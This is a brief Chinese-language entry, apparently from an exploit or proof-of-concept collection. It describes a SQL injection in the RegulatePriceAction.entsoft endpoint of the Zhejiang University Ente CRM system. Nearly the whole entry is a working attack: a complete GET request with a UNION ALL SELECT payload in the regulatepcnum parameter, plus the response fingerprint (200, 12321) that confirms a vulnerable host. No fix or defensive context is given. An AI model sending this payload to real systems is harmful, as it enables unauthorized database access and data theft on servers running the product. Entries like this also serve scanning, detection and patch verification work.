# 浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接口SQL注入漏洞

浙大恩特客户资源管理系统RegulatePriceAction.entsoft;.js接 ｜ SQL注入 ｜ —
- **请求**：`GET /entsoft/RegulatePriceAction.entsoft?method=getRegulatePricedlist&regulatepcnum=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,123*123,111*1111--+aaaa HTTP/1.1`
- **响应特征**：200 12321